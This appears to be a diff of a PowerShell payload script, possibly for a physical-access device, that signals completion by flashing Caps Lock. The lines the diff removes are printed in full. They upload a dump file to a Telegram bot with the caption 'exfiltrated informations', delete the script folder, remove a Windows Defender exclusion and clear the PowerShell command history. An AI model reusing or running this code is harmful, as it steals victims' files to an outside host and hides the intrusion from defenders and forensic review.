@@ -43,52 +43,6 @@ while (!(Test-Path "$dumpFile")) {
     Start-Sleep -Seconds 1
 }
 
-# Telegram configuration
-$token = "<TOKEN>"
-$chatID = "<CHATID>"
-$uri = "https://api.telegram.org/bot$token/sendDocument"
-$caption = "Here are exfiltrated informations from $env:USERNAME"
-
-# Check if the file exists before sending
-if (!(Test-Path $dumpFile)) {
-    exit 1
-}
-
-# Ensure System.Net.Http is available
-if (-not ("System.Net.Http.HttpClient" -as [type])) {
-    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
-    if ($httpPath) {
-        Add-Type -Path $httpPath
-    } else {
-        exit 1
-    }
-}
-
-# Create HTTP client
-$client = New-Object System.Net.Http.HttpClient
-$content = New-Object System.Net.Http.MultipartFormDataContent
-$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
-$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
-
-# Attach the ZIP file
-$filename = [System.IO.Path]::GetFileName("$dumpFile")
-$fileStream = [System.IO.File]::OpenRead("$dumpFile")
-$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
-$content.Add($fileContent, "document", $filename)
-
-# Send data to Telegram
-try {
-    $client.PostAsync($uri, $content).Wait()
-} catch {}
-
-# Cleanup
-$fileStream.Close()
-$fileStream.Dispose()
-
-Set-Location C:\Users\Public\Documents
-Remove-Item -Recurse -Force scripts
-Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
 
 # Caps Lock signal
 $keyBoardObject = New-Object -ComObject WScript.Shell
@@ -97,7 +51,3 @@ for ($i=0; $i -lt 4; $i++) {
     Start-Sleep -Seconds 1
 }
 
-# Clear command history
-Clear-Content (Get-PSReadlineOption).HistorySavePath
-
-exit
